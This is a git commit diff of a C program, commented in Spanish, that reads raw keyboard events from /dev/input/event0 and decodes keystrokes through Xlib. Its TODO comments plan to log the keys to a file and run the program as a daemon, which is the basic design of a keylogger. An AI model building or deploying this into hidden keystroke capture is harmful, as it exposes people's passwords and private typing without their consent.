1a779d09add062854592159244e3c50f72289efe
thefang12 <thefang12@gmail.com>
2017-11-03 22:32:03 -0400

    agregar documentacion correcta

--- main.c
+++ main.c
@@ -20,17 +20,15 @@ XKeyEvent createKeyEvent(Display *display,
                          Bool     press,
                          int      keycode,
                          int      modifiers);
-
-
 int main(void) {
-  // ubicacion del archivo de dispisitivo de teclado cambia dependiando el
+  // ubicacion del archivo de dispisitivo de teclado cambia dependiendo el
   // sistema
+  // /dev/input/eventN es una interfaz a los drivers de sistema por el modulo evdev del kernel
+  //devuelve los keycodes que interpreto el kernel de los scancodes leidos del driver
   const char *dev = "/dev/input/event0";
 
-  // **evento es todo lo que proveen los drivers
   // estructura definida en input.h guarda datos del evdev: una interfaz-handler
   // generica para manejar  todos los eventos
-
   struct input_event ev;
   ssize_t n;
   int     fd;
@@ -42,21 +40,25 @@ int main(void) {
     fprintf(stderr, "Cannot open %s: %s.\n", dev, strerror(errno));
     return EXIT_FAILURE;
   }
-
+  //incializacion de  para creacion de evento falso
+  //X Window System provee librerias para manipular keycodes dado que es una aplicacion en keycode mode
+  //http://www.tldp.org/HOWTO/Keyboard-and-Console-HOWTO-2.html para mas informacion al respecto
+  //Desafortunadamente, dado que X toma keycodes y los interpreta su tabla de mapeo
+  //de teclas es diferente a la del resto del SO
+  //Afortunadamente, la diferencia entre una y otra tabla es de 8 enteros es decir
+  // en consola la tecla b = 48 y en xorg b = 56
+  //esto nos permite usar las librerias de X para decodificar los keycodes del driver del teclado
   Display *display;
   Window   window;
   int s;
   XEvent event;
-
   /* open connection with the server */
   display = XOpenDisplay(NULL);
-
   if (display == NULL)
   {
     fprintf(stderr, "Cannot open display\n");
     exit(1);
   }
-
   // Get the root window for the current display.
   Window winRoot = XDefaultRootWindow(display);
 
@@ -84,9 +86,9 @@ int main(void) {
       break; // termina ERROR
     }
 
-    // si se escribe al mismo tiempo en consola parece que se estan
-    // interpretando los keycodes,
+    // **si se escribe al mismo tiempo en consola parece que se estan interpretando los keycodes,
     // pero solo es la consola reconociendo los caracters e imprimiendolos XD
+
     // ev.type nos dice que tipo de evento que buscamos
     // EV_KEY = Used to describe state changes of keyboards, buttons, or other
     // key-like devices.
@@ -96,8 +98,15 @@ int main(void) {
     // TODO guardar en archivo
     // TODO*** volver proceso en daemon
     // TODO agregar ctrl+alt+shift  para terminar este proceso
+
+    ////presionado
     if ((ev.type == EV_KEY) && (ev.value == 1)) {
+      //ev.code nos devuelve los keycodes -> variable numericas que representan las teclas fisicas
+      //estas constantes son las mismas en todas las arquitecturas y on independientes de hardware
+      //mas info https://www.kernel.org/doc/html/v4.13/input/event-codes.html#input-event-codes
       switch (ev.code) {
+      //la variable ac registra los modificadores--> teclas que cambian el output de otras teclas
+      //mas informacion https://tronche.com/gui/x/xlib/events/keyboard-pointer/keyboard-pointer.html#XKeyEvent
       case KEY_LEFTSHIFT:
         ac |= ShiftMask;
         break;
@@ -147,9 +156,10 @@ int main(void) {
         if (keyEv.keycode == 0x09) break;
       }
     }
-
+    ////liberado
     if ((ev.type == EV_KEY) && (ev.value == 0)) {
       switch (ev.code) {
+
       case KEY_LEFTSHIFT:
         ac -= ShiftMask;
         break;
@@ -173,12 +183,11 @@ int main(void) {
       case KEY_RIGHTCTRL:
         ac -= ControlMask;
         break;
-
       default:
         printf("CODE = %d \t EVENT = %d\n", ev.code, (int)ev.value);
         char   string[200];
         KeySym keysym;
-        XKeyEvent keyEv = createKeyEvent(display, winFocus, winRoot, True, ev.code + 8, ac|caps|numlock);
+        XKeyEvent keyEv = createKeyEvent(display, winFocus, winRoot, False, ev.code + 8, ac|caps|numlock);
         XLookupString(&keyEv, string, 200, &keysym, NULL);
         printf("Se  detecto Keypress con Keycode  = %i\n",      keyEv.keycode);
         printf("Se  detecto Keypress con estado  = %li\n",      keyEv.state); //
@@ -187,18 +196,18 @@ int main(void) {
         if (keyEv.keycode == 0x09) break;
       }
     }
-
-    // printf("%s 0x%04x (%d)\n", evval[ev.value], (int)ev.code, (int)ev.code);
   }
   fflush(stdout);
   fprintf(stderr, "%s.\n", strerror(errno));
   return EXIT_FAILURE;
 }
-
+// funcion obtenida de http://www.doctort.org/adam/nerd-notes/x11-fake-keypress-event.html
 XKeyEvent createKeyEvent(Display *display, Window win, Window winRoot, Bool press, int keycode, int modifiers)
 {
-  XKeyEvent event;
+  //mas info de XKeyEvent struct
+  //https://tronche.com/gui/x/xlib/events/keyboard-pointer/keyboard-pointer.html#XKeyEvent
 
+  XKeyEvent event;
   event.display     = display;
   event.window      = win;
   event.root        = winRoot;
